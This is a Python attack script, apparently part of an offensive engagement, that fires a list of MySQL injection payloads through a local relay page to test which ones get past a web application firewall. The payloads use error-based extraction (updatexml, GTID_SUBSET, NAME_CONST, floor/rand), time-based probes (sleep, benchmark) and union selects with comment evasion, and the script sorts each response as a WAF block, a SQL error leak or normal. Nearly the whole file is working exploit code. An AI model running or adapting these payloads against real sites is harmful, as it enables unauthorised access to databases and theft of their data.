#!/usr/bin/env python3
"""yj_waf_bypass2.py - 更多WAF绕过payload"""
import urllib.request, urllib.parse, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
OUT = 'http://127.0.0.1:13080/yj_out2.php'
RESULT = 'http://127.0.0.1:13080/yj_result.txt'

def probe(payload):
    url = OUT + '?id=' + urllib.parse.quote(payload)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=25, context=ctx)
        r.read(3000)
    except Exception:
        pass
    try:
        r2 = urllib.request.urlopen(urllib.request.Request(RESULT, headers=UA), timeout=15, context=ctx)
        return r2.read(30000).decode('utf-8', 'ignore')
    except Exception:
        return ''

payloads = [
    ("updatexml", "687' and updatexml(1,concat(0x7e,database(),0x7e),1)-- -"),
    ("GTID", "687' and GTID_SUBSET(concat(0x7e,database(),0x7e),1)-- -"),
    ("NAME_CONST", "687' and (select 1 from(select NAME_CONST(database(),1))a)-- -"),
    ("floor", "687' and (select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -"),
    ("sleep", "687' and sleep(3)-- -"),
    ("benchmark", "687' and benchmark(10000000,md5(1))-- -"),
    ("union直选", "687' union select 1,2,3,4,5-- -"),
    ("union注释", "687' union select 1,2,3,4,5#"),
    ("union内联", "687' union /*!50000select*/ 1,2,3,4,5-- -"),
]

import time
for name, payload in payloads:
    body = probe(payload)
    if '400' in body[:50]:
        st = 'WAF(400)'
    elif 'error in your SQL' in body:
        m = re.search(r"error in your SQL syntax[^<]{0,120}", body, re.I)
        st = 'SQL-ERR :: ' + (m.group(0) if m else '')
    elif 'XPATH' in body:
        m = re.search(r"XPATH[^<]{0,200}", body)
        st = 'XPATH :: ' + (m.group(0) if m else '')
    elif 'Duplicate' in body or 'duplicate' in body:
        st = 'DUPLICATE-ERR'
    elif len(body) > 1500:
        st = 'NORMAL(%d)' % len(body)
    else:
        st = 'OTHER(%d)' % len(body)
    print('%-16s %s' % (name, st[:180]), flush=True)
